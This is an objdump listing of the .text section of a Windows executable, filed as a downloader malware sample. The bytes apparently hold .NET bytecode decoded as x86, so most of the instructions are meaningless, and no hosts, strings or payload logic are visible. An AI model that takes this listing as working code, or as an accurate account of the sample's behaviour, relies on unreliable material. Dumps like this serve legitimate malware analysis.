
malware_samples/downloader/c7b4feb07b7c28374a686aece15aa7bddb871f3225e0bce6136aefb38e92f196.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	60                   	pusha
  402001:	97                   	xchg   %eax,%edi
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 4a 00    	add    %al,0x4af400
  402013:	00 34 4c             	add    %dh,(%esp,%ecx,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	77 00                	ja     0x40201e
  40201e:	00 06                	add    %al,(%esi)
  402020:	10 4a 00             	adc    %cl,0x0(%edx)
  402023:	00 e1                	add    %ah,%cl
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 0a                	xor    %cl,(%edx)
  402053:	00 ce                	add    %cl,%dh
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 72 01             	adc    %esi,0x1(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	80 00 00             	addb   $0x0,(%eax)
  402065:	00 73 0e             	add    %dh,0xe(%ebx)
  402068:	00 00                	add    %al,(%eax)
  40206a:	0a 0a                	or     (%edx),%cl
  40206c:	05 20 80 00 00       	add    $0x8020,%eax
  402071:	00 73 0e             	add    %dh,0xe(%ebx)
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 0b                	or     (%ebx),%cl
  402078:	12 02                	adc    (%edx),%al
  40207a:	fe                   	(bad)
  40207b:	15 03 00 00 02       	adc    $0x2000003,%eax
  402080:	03 28                	add    (%eax),%ebp
  402082:	0f 00 00             	sldt   (%eax)
  402085:	0a 2d 08 12 02 03    	or     0x3021208,%ch
  40208b:	7d 03                	jge    0x402090
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 02                	add    $0x2,%al
  402091:	28 0f                	sub    %cl,(%edi)
  402093:	00 00                	add    %al,(%eax)
  402095:	0a 2d 08 12 02 02    	or     0x2021208,%ch
  40209b:	7d 04                	jge    0x4020a1
  40209d:	00 00                	add    %al,(%eax)
  40209f:	04 12                	add    $0x12,%al
  4020a1:	02 08                	add    (%eax),%cl
  4020a3:	28 01                	sub    %al,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	2b 7d 01             	sub    0x1(%ebp),%edi
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 16                	add    $0x16,%al
  4020ae:	0d 18 13 04 0e       	or     $0xe041318,%eax
  4020b3:	04 17                	add    $0x17,%al
  4020b5:	5f                   	pop    %edi
  4020b6:	17                   	pop    %ss
  4020b7:	33 1b                	xor    (%ebx),%ebx
  4020b9:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 00                	add    $0x0,%al
  4020c0:	60                   	pusha
  4020c1:	13 04 0e             	adc    (%esi,%ecx,1),%eax
  4020c4:	05 18 5f 18 33       	add    $0x33185f18,%eax
  4020c9:	0a 11                	or     (%ecx),%dl
  4020cb:	04 20                	add    $0x20,%al
  4020cd:	80 00 00             	addb   $0x0,(%eax)
  4020d0:	00 60 13             	add    %ah,0x13(%eax)
  4020d3:	04 12                	add    $0x12,%al
  4020d5:	02 04 7e             	add    (%esi,%edi,2),%al
  4020d8:	11 00                	adc    %eax,(%eax)
  4020da:	00 0a                	add    %cl,(%edx)
  4020dc:	16                   	push   %ss
  4020dd:	07                   	pop    %es
  4020de:	20 80 00 00 00 06    	and    %al,0x6000000(%eax)
  4020e4:	20 80 00 00 00 12    	and    %al,0x12000000(%eax)
  4020ea:	03 11                	add    (%ecx),%edx
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	01 00                	add    %eax,(%eax)
  4020f0:	00 06                	add    %al,(%esi)
  4020f2:	13 05 11 05 2d 30    	adc    0x302d0511,%eax
  4020f8:	73 04                	jae    0x4020fe
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	06                   	push   %es
  4020fd:	13 06                	adc    (%esi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	12 00                	adc    (%eax),%al
  402105:	00 0a                	add    %cl,(%edx)
  402107:	7d 21                	jge    0x40212a
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 11                	add    $0x11,%al
  40210d:	06                   	push   %es
  40210e:	06                   	push   %es
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	12 00                	adc    (%eax),%al
  402112:	00 0a                	add    %cl,(%edx)
  402114:	7d 22                	jge    0x402138
  402116:	00 00                	add    %al,(%eax)
  402118:	04 11                	add    $0x11,%al
  40211a:	06                   	push   %es
  40211b:	72 01                	jb     0x40211e
  40211d:	00 00                	add    %al,(%eax)
  40211f:	70 7d                	jo     0x40219e
  402121:	23 00                	and    (%eax),%eax
  402123:	00 04 11             	add    %al,(%ecx,%edx,1)
  402126:	06                   	push   %es
  402127:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40212a:	1e                   	push   %ds
  40212b:	02 28                	add    (%eax),%ch
  40212d:	13 00                	adc    (%eax),%eax
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	2a a2 02 7e 16 00    	sub    0x167e02(%edx),%ah
  402137:	00 0a                	add    %cl,(%edx)
  402139:	7d 21                	jge    0x40215c
  40213b:	00 00                	add    %al,(%eax)
  40213d:	04 02                	add    $0x2,%al
  40213f:	7e 16                	jle    0x402157
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 7d 22             	or     0x22(%ebp),%bh
  402146:	00 00                	add    %al,(%eax)
  402148:	04 02                	add    $0x2,%al
  40214a:	7e 16                	jle    0x402162
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 23             	or     0x23(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 02                	add    $0x2,%al
  402155:	28 13                	sub    %dl,(%ebx)
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 2a                	or     (%edx),%ch
  40215b:	1e                   	push   %ds
  40215c:	02 7b 24             	add    0x24(%ebx),%bh
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2a                	add    $0x2a,%al
  402163:	22 02                	and    (%edx),%al
  402165:	03 7d 24             	add    0x24(%ebp),%edi
  402168:	00 00                	add    %al,(%eax)
  40216a:	04 2a                	add    $0x2a,%al
  40216c:	2a 1f                	sub    (%edi),%bl
  40216e:	78 1f                	js     0x40218f
  402170:	32 73 17             	xor    0x17(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 2a                	or     (%edx),%ch
  402177:	06                   	push   %es
  402178:	2a 22                	sub    (%edx),%ah
  40217a:	16                   	push   %ss
  40217b:	16                   	push   %ss
  40217c:	73 18                	jae    0x402196
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 2a                	or     (%edx),%ch
  402182:	06                   	push   %es
  402183:	2a 0e                	sub    (%esi),%cl
  402185:	1f                   	pop    %ds
  402186:	19 2a                	sbb    %ebp,(%edx)
  402188:	06                   	push   %es
  402189:	2a 00                	sub    (%eax),%al
  40218b:	00 03                	add    %al,(%ebx)
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 53 00             	add    %dl,0x0(%ebx)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 7b 26             	add    0x26(%ebx),%bh
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 2c                	add    $0x2c,%al
  40219f:	13 02                	adc    (%edx),%eax
  4021a1:	7b 26                	jnp    0x4021c9
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 6f                	add    $0x6f,%al
  4021a7:	19 00                	sbb    %eax,(%eax)
  4021a9:	00 0a                	add    %cl,(%edx)
  4021ab:	02 14 7d 26 00 00 04 	add    0x4000026(,%edi,2),%dl
  4021b2:	2a 02                	sub    (%edx),%al
  4021b4:	73 1a                	jae    0x4021d0
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0a 7d 26             	or     0x26(%ebp),%bh
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	04 02                	add    $0x2,%al
  4021bf:	7b 26                	jnp    0x4021e7
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	04 23                	add    $0x23,%al
	...
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	1b 00                	sbb    (%eax),%eax
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	02 7b 26             	add    0x26(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 16                	add    $0x16,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	1c 00                	sbb    $0x0,%al
  4021dc:	00 0a                	add    %cl,(%edx)
  4021de:	02 7b 26             	add    0x26(%ebx),%bh
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 17                	add    $0x17,%al
  4021e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e6:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  4021eb:	1e                   	push   %ds
  4021ec:	02 7b 25             	add    0x25(%ebx),%bh
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 2a                	add    $0x2a,%al
  4021f3:	22 02                	and    (%edx),%al
  4021f5:	03 7d 25             	add    0x25(%ebp),%edi
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 2a                	add    $0x2a,%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	05 00 7f 00 00       	add    $0x7f00,%eax
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 0f                	adc    %ecx,(%edi)
  402209:	01 28                	add    %ebp,(%eax)
  40220b:	1e                   	push   %ds
  40220c:	00 00                	add    %al,(%eax)
  40220e:	0a 0f                	or     (%edi),%cl
  402210:	01 28                	add    %ebp,(%eax)
  402212:	1f                   	pop    %ds
  402213:	00 00                	add    %al,(%eax)
  402215:	0a 59 17             	or     0x17(%ecx),%bl
  402218:	58                   	pop    %eax
  402219:	0f 01                	(bad)
  40221b:	28 20                	sub    %ah,(%eax)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	0a 0f                	or     (%edi),%cl
  402221:	01 28                	add    %ebp,(%eax)
  402223:	21 00                	and    %eax,(%eax)
  402225:	00 0a                	add    %cl,(%edx)
  402227:	59                   	pop    %ecx
  402228:	17                   	pop    %ss
  402229:	58                   	pop    %eax
  40222a:	73 22                	jae    0x40224e
  40222c:	00 00                	add    %al,(%eax)
  40222e:	0a 0a                	or     (%edx),%cl
  402230:	16                   	push   %ss
  402231:	0b 2b                	or     (%ebx),%ebp
  402233:	3f                   	aas
  402234:	16                   	push   %ss
  402235:	0c 2b                	or     $0x2b,%al
  402237:	25 06 07 08 28       	and    $0x28080706,%eax
  40223c:	23 00                	and    (%eax),%eax
  40223e:	00 0a                	add    %cl,(%edx)
  402240:	1f                   	pop    %ds
  402241:	20 02                	and    %al,(%edx)
  402243:	7b 25                	jnp    0x40226a
  402245:	00 00                	add    %al,(%eax)
  402247:	04 02                	add    $0x2,%al
  402249:	7b 24                	jnp    0x40226f
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 16                	add    $0x16,%al
  40224f:	73 24                	jae    0x402275
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 81 0e 00 00 01    	or     0x100000e(%ecx),%al
  402259:	08 17                	or     %dl,(%edi)
  40225b:	58                   	pop    %eax
  40225c:	0c 08                	or     $0x8,%al
  40225e:	0f 01                	(bad)
  402260:	28 20                	sub    %ah,(%eax)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 0f                	or     (%edi),%cl
  402266:	01 28                	add    %ebp,(%eax)
  402268:	21 00                	and    %eax,(%eax)
  40226a:	00 0a                	add    %cl,(%edx)
  40226c:	59                   	pop    %ecx
  40226d:	31 c9                	xor    %ecx,%ecx
  40226f:	07                   	pop    %es
  402270:	17                   	pop    %ss
  402271:	58                   	pop    %eax
  402272:	0b 07                	or     (%edi),%eax
  402274:	0f 01                	(bad)
  402276:	28 1e                	sub    %bl,(%esi)
  402278:	00 00                	add    %al,(%eax)
  40227a:	0a 0f                	or     (%edi),%cl
  40227c:	01 28                	add    %ebp,(%eax)
  40227e:	1f                   	pop    %ds
  40227f:	00 00                	add    %al,(%eax)
  402281:	0a 59 31             	or     0x31(%ecx),%bl
  402284:	af                   	scas   %es:(%edi),%eax
  402285:	06                   	push   %es
  402286:	2a 0a                	sub    (%edx),%cl
  402288:	17                   	pop    %ss
  402289:	2a 36                	sub    (%esi),%dh
  40228b:	20 f0                	and    %dh,%al
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 1f                	add    %bl,(%edi)
  402291:	54                   	push   %esp
  402292:	73 17                	jae    0x4022ab
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 2a                	or     (%edx),%ch
  402298:	2a 1f                	sub    (%edi),%bl
  40229a:	78 1f                	js     0x4022bb
  40229c:	54                   	push   %esp
  40229d:	73 17                	jae    0x4022b6
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	0a 2a                	or     (%edx),%ch
  4022a3:	9e                   	sahf
  4022a4:	03 1a                	add    (%edx),%ebx
  4022a6:	5f                   	pop    %edi
  4022a7:	2c 11                	sub    $0x11,%al
  4022a9:	72 01                	jb     0x4022ac
  4022ab:	00 00                	add    %al,(%eax)
  4022ad:	70 72                	jo     0x402321
  4022af:	01 00                	add    %eax,(%eax)
  4022b1:	00 70 17             	add    %dh,0x17(%eax)
  4022b4:	28 27                	sub    %ah,(%edi)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	06                   	push   %es
  4022b9:	2a 72 01             	sub    0x1(%edx),%dh
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	70 72                	jo     0x402332
  4022c0:	01 00                	add    %eax,(%eax)
  4022c2:	00 70 16             	add    %dh,0x16(%eax)
  4022c5:	28 27                	sub    %ah,(%edi)
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	06                   	push   %es
  4022ca:	2a 06                	sub    (%esi),%al
  4022cc:	2a 06                	sub    (%esi),%al
  4022ce:	2a 06                	sub    (%esi),%al
  4022d0:	2a 00                	sub    (%eax),%al
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	1a 00                	sbb    (%eax),%al
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	03 00                	add    (%eax),%eax
  4022de:	00 11                	add    %dl,(%ecx)
  4022e0:	12 00                	adc    (%eax),%al
  4022e2:	fe                   	(bad)
  4022e3:	15 0d 00 00 01       	adc    $0x100000d,%eax
  4022e8:	12 00                	adc    (%eax),%al
  4022ea:	16                   	push   %ss
  4022eb:	28 25 00 00 0a 12    	sub    %ah,0x120a0000
  4022f1:	00 16                	add    %dl,(%esi)
  4022f3:	28 26                	sub    %ah,(%esi)
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	0a 06                	or     (%esi),%al
  4022f9:	2a 06                	sub    (%esi),%al
  4022fb:	2a 13                	sub    (%ebx),%dl
  4022fd:	30 02                	xor    %al,(%edx)
  4022ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	04 00                	add    $0x0,%al
  402306:	00 11                	add    %dl,(%ecx)
  402308:	12 00                	adc    (%eax),%al
  40230a:	fe                   	(bad)
  40230b:	15 0c 00 00 01       	adc    $0x100000c,%eax
  402310:	12 00                	adc    (%eax),%al
  402312:	1f                   	pop    %ds
  402313:	32 28                	xor    (%eax),%ch
  402315:	27                   	daa
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 12                	or     (%edx),%dl
  40231a:	00 1f                	add    %bl,(%edi)
  40231c:	78 28                	js     0x402346
  40231e:	28 00                	sub    %al,(%eax)
  402320:	00 0a                	add    %cl,(%edx)
  402322:	06                   	push   %es
  402323:	2a 06                	sub    (%esi),%al
  402325:	2a 2e                	sub    (%esi),%ch
  402327:	28 29                	sub    %ch,(%ecx)
  402329:	00 00                	add    %al,(%eax)
  40232b:	0a 6f 2a             	or     0x2a(%edi),%ch
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 2a                	or     (%edx),%ch
  402332:	06                   	push   %es
  402333:	2a 3e                	sub    (%esi),%bh
  402335:	02 1f                	add    (%edi),%bl
  402337:	0f 7d                	(bad)
  402339:	24 00                	and    $0x0,%al
  40233b:	00 04 02             	add    %al,(%edx,%eax,1)
  40233e:	28 2b                	sub    %ch,(%ebx)
  402340:	00 00                	add    %al,(%eax)
  402342:	0a 2a                	or     (%edx),%ch
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	05 00 51 02 00       	add    $0x25100,%eax
  40234b:	00 05 00 00 11 73    	add    %al,0x73110000
  402351:	1a 00                	sbb    (%eax),%al
  402353:	00 0a                	add    %cl,(%edx)
  402355:	0a 06                	or     (%esi),%al
  402357:	22 00                	and    (%eax),%al
  402359:	00 c0                	add    %al,%al
  40235b:	40                   	inc    %eax
  40235c:	22 00                	and    (%eax),%al
  40235e:	00 50 41             	add    %dl,0x41(%eax)
  402361:	73 2c                	jae    0x40238f
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 6f 2d             	or     0x2d(%edi),%ch
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 06                	or     (%esi),%al
  40236c:	17                   	pop    %ss
  40236d:	6f                   	outsl  %ds:(%esi),(%dx)
  40236e:	2e 00 00             	add    %al,%cs:(%eax)
  402371:	0a 73 2f             	or     0x2f(%ebx),%dh
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 0b                	or     (%ebx),%cl
  402378:	73 30                	jae    0x4023aa
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  40237f:	31 00                	xor    %eax,(%eax)
  402381:	00 0a                	add    %cl,(%edx)
  402383:	0d 73 31 00 00       	or     $0x3173,%eax
  402388:	0a 13                	or     (%ebx),%dl
  40238a:	04 03                	add    $0x3,%al
  40238c:	28 0f                	sub    %cl,(%edi)
  40238e:	00 00                	add    %al,(%eax)
  402390:	0a 2c 1d 05 2c 0d 07 	or     0x70d2c05(,%ebx,1),%ch
  402397:	72 03                	jb     0x40239c
  402399:	00 00                	add    %al,(%eax)
  40239b:	70 6f                	jo     0x40240c
  40239d:	32 00                	xor    (%eax),%al
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	2b 14 07             	sub    (%edi,%eax,1),%edx
  4023a4:	72 25                	jb     0x4023cb
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	70 6f                	jo     0x402419
  4023aa:	32 00                	xor    (%eax),%al
  4023ac:	00 0a                	add    %cl,(%edx)
  4023ae:	2b 07                	sub    (%edi),%eax
  4023b0:	07                   	pop    %es
  4023b1:	03 6f 32             	add    0x32(%edi),%ebp
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	0a 07                	or     (%edi),%al
  4023b8:	1f                   	pop    %ds
  4023b9:	09 1f                	or     %ebx,(%edi)
  4023bb:	13 73 33             	adc    0x33(%ebx),%esi
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 6f 34             	or     0x34(%edi),%ch
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 07                	or     (%edi),%al
  4023c7:	06                   	push   %es
  4023c8:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  4023ce:	36 00 00             	add    %al,%ss:(%eax)
  4023d1:	0a 13                	or     (%ebx),%dl
  4023d3:	08 12                	or     %dl,(%edx)
  4023d5:	08 28                	or     %ch,(%eax)
  4023d7:	37                   	aaa
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	0a 1b                	or     (%ebx),%bl
  4023dc:	5a                   	pop    %edx
  4023dd:	1e                   	push   %ds
  4023de:	5b                   	pop    %ebx
  4023df:	1f                   	pop    %ds
  4023e0:	12 59 16             	adc    0x16(%ecx),%bl
  4023e3:	73 38                	jae    0x40241d
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	0a 6f 39             	or     0x39(%edi),%ch
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 07                	or     (%edi),%al
  4023ee:	17                   	pop    %ss
  4023ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f0:	3a 00                	cmp    (%eax),%al
  4023f2:	00 0a                	add    %cl,(%edx)
  4023f4:	06                   	push   %es
  4023f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f6:	3b 00                	cmp    (%eax),%eax
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	07                   	pop    %es
  4023fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fc:	3c 00                	cmp    $0x0,%al
  4023fe:	00 0a                	add    %cl,(%edx)
  402400:	05 2c 07 08 17       	add    $0x1708072c,%eax
  402405:	6f                   	outsl  %ds:(%esi),(%dx)
  402406:	3d 00 00 0a 08       	cmp    $0x80a0000,%eax
  40240b:	04 50                	add    $0x50,%al
  40240d:	6f                   	outsl  %ds:(%esi),(%dx)
  40240e:	32 00                	xor    (%eax),%al
  402410:	00 0a                	add    %cl,(%edx)
  402412:	08 1f                	or     %bl,(%edi)
  402414:	0c 07                	or     $0x7,%al
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	3e 00 00             	add    %al,%ds:(%eax)
  40241a:	0a 07                	or     (%edi),%al
  40241c:	6f                   	outsl  %ds:(%esi),(%dx)
  40241d:	3f                   	aas
  40241e:	00 00                	add    %al,(%eax)
  402420:	0a 1f                	or     (%edi),%bl
  402422:	0c 59                	or     $0x59,%al
  402424:	1f                   	pop    %ds
  402425:	14 6f                	adc    $0x6f,%al
  402427:	40                   	inc    %eax
  402428:	00 00                	add    %al,(%eax)
  40242a:	0a 16                	or     (%esi),%dl
  40242c:	28 1f                	sub    %bl,(%edi)
  40242e:	00 00                	add    %al,(%eax)
  402430:	06                   	push   %es
  402431:	28 41 00             	sub    %al,0x0(%ecx)
  402434:	00 0a                	add    %cl,(%edx)
  402436:	13 05 11 05 28 0f    	adc    0xf280511,%eax
  40243c:	00 00                	add    %al,(%eax)
  40243e:	0a 2c 0d 09 72 47 00 	or     0x477209(,%ecx,1),%ch
  402445:	00 70 6f             	add    %dh,0x6f(%eax)
  402448:	32 00                	xor    (%eax),%al
  40244a:	00 0a                	add    %cl,(%edx)
  40244c:	2b 08                	sub    (%eax),%ecx
  40244e:	09 11                	or     %edx,(%ecx)
  402450:	05 6f 32 00 00       	add    $0x326f,%eax
  402455:	0a 17                	or     (%edi),%dl
  402457:	28 1f                	sub    %bl,(%edi)
  402459:	00 00                	add    %al,(%eax)
  40245b:	06                   	push   %es
  40245c:	28 41 00             	sub    %al,0x0(%ecx)
  40245f:	00 0a                	add    %cl,(%edx)
  402461:	13 06                	adc    (%esi),%eax
  402463:	11 06                	adc    %eax,(%esi)
  402465:	28 0f                	sub    %cl,(%edi)
  402467:	00 00                	add    %al,(%eax)
  402469:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  40246c:	11 04 72             	adc    %eax,(%edx,%esi,2)
  40246f:	4d                   	dec    %ebp
  402470:	00 00                	add    %al,(%eax)
  402472:	70 6f                	jo     0x4024e3
  402474:	32 00                	xor    (%eax),%al
  402476:	00 0a                	add    %cl,(%edx)
  402478:	2b 09                	sub    (%ecx),%ecx
  40247a:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40247d:	06                   	push   %es
  40247e:	6f                   	outsl  %ds:(%esi),(%dx)
  40247f:	32 00                	xor    (%eax),%al
  402481:	00 0a                	add    %cl,(%edx)
  402483:	09 17                	or     %edx,(%edi)
  402485:	6f                   	outsl  %ds:(%esi),(%dx)
  402486:	42                   	inc    %edx
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 11                	or     (%ecx),%dl
  40248b:	04 18                	add    $0x18,%al
  40248d:	6f                   	outsl  %ds:(%esi),(%dx)
  40248e:	42                   	inc    %edx
  40248f:	00 00                	add    %al,(%eax)
  402491:	0a 09                	or     (%ecx),%cl
  402493:	1f                   	pop    %ds
  402494:	0c 07                	or     $0x7,%al
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	3f                   	aas
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 20                	or     (%eax),%ah
  40249c:	9e                   	sahf
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 59 28             	add    %bl,0x28(%ecx)
  4024a2:	43                   	inc    %ebx
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 07                	or     (%edi),%al
  4024a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a8:	3e 00 00             	add    %al,%ds:(%eax)
  4024ab:	0a 1f                	or     (%edi),%bl
  4024ad:	24 58                	and    $0x58,%al
  4024af:	1f                   	pop    %ds
  4024b0:	4b                   	dec    %ebx
  4024b1:	1f                   	pop    %ds
  4024b2:	17                   	pop    %ss
  4024b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b4:	40                   	inc    %eax
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	0a 11                	or     (%ecx),%dl
  4024b9:	04 1f                	add    $0x1f,%al
  4024bb:	5d                   	pop    %ebp
  4024bc:	07                   	pop    %es
  4024bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024be:	3f                   	aas
  4024bf:	00 00                	add    %al,(%eax)
  4024c1:	0a 1f                	or     (%edi),%bl
  4024c3:	4d                   	dec    %ebp
  4024c4:	59                   	pop    %ecx
  4024c5:	28 43 00             	sub    %al,0x0(%ebx)
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	07                   	pop    %es
  4024cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cc:	3e 00 00             	add    %al,%ds:(%eax)
  4024cf:	0a 1f                	or     (%edi),%bl
  4024d1:	24 58                	and    $0x58,%al
  4024d3:	1f                   	pop    %ds
  4024d4:	4b                   	dec    %ebx
  4024d5:	1f                   	pop    %ds
  4024d6:	17                   	pop    %ss
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	40                   	inc    %eax
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	0a 02                	or     (%edx),%al
  4024dd:	28 0f                	sub    %cl,(%edi)
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4024e4:	06                   	push   %es
  4024e5:	28 29                	sub    %ch,(%ecx)
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 6f 2a             	or     0x2a(%edi),%ch
  4024ec:	00 00                	add    %al,(%eax)
  4024ee:	0a 6f 32             	or     0x32(%edi),%ch
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	0a 2b                	or     (%ebx),%ch
  4024f5:	07                   	pop    %es
  4024f6:	06                   	push   %es
  4024f7:	02 6f 32             	add    0x32(%edi),%ch
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	0a 06                	or     (%esi),%al
  4024fe:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402504:	6f                   	outsl  %ds:(%esi),(%dx)
  402505:	3f                   	aas
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 1f                	or     (%edi),%bl
  40250a:	0a 58 28             	or     0x28(%eax),%bl
  40250d:	43                   	inc    %ebx
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 07                	or     (%edi),%al
  402512:	6f                   	outsl  %ds:(%esi),(%dx)
  402513:	3e 00 00             	add    %al,%ds:(%eax)
  402516:	0a 1f                	or     (%edi),%bl
  402518:	47                   	inc    %edi
  402519:	58                   	pop    %eax
  40251a:	73 38                	jae    0x402554
  40251c:	00 00                	add    %al,(%eax)
  40251e:	0a 6f 44             	or     0x44(%edi),%ch
  402521:	00 00                	add    %al,(%eax)
  402523:	0a 06                	or     (%esi),%al
  402525:	6f                   	outsl  %ds:(%esi),(%dx)
  402526:	3b 00                	cmp    (%eax),%eax
  402528:	00 0a                	add    %cl,(%edx)
  40252a:	19 8d 3b 00 00 01    	sbb    %ecx,0x100003b(%ebp)
  402530:	13 09                	adc    (%ecx),%ecx
  402532:	11 09                	adc    %ecx,(%ecx)
  402534:	16                   	push   %ss
  402535:	08 a2 11 09 17 09    	or     %ah,0x9170911(%edx)
  40253b:	a2 11 09 18 11       	mov    %al,0x11180911
  402540:	04 a2                	add    $0xa2,%al
  402542:	11 09                	adc    %ecx,(%ecx)
  402544:	6f                   	outsl  %ds:(%esi),(%dx)
  402545:	45                   	inc    %ebp
  402546:	00 00                	add    %al,(%eax)
  402548:	0a 06                	or     (%esi),%al
  40254a:	19 6f 46             	sbb    %ebp,0x46(%edi)
  40254d:	00 00                	add    %al,(%eax)
  40254f:	0a 06                	or     (%esi),%al
  402551:	17                   	pop    %ss
  402552:	6f                   	outsl  %ds:(%esi),(%dx)
  402553:	47                   	inc    %edi
  402554:	00 00                	add    %al,(%eax)
  402556:	0a 06                	or     (%esi),%al
  402558:	28 48 00             	sub    %cl,0x0(%eax)
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	6f                   	outsl  %ds:(%esi),(%dx)
  40255e:	49                   	dec    %ecx
  40255f:	00 00                	add    %al,(%eax)
  402561:	0a 28                	or     (%eax),%ch
  402563:	4a                   	dec    %edx
  402564:	00 00                	add    %al,(%eax)
